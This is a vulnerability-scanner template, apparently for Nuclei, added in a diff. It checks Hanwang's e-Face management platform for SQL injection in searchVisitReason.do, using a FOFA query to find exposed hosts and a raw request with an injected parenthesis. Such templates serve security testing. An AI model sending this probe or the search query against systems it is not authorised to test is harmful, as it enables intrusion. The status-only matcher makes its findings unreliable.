@@ -1,0 +1,19 @@
+id: poc-vn4ru3e92zy66yq1
+info:
+  name: 汉王e脸通综合管理平台 searchVisitReason.do 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vn4ru3e92zy66yq1'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vn4ru3e92zy66yq1
+    fofa: body="async src=\"/pwacompat.min.js" && body="minimum-scale=1" && body="window.routerBase"||title="汉王智慧园区"
+http:
+- raw:
+  - GET /manage/visitorConfigManage/searchVisitReason.do?branchId=1&columnKey=(&deviceName=test&id=1&order=desc&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-06-25&end=2025-06-25&groupId=1 HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
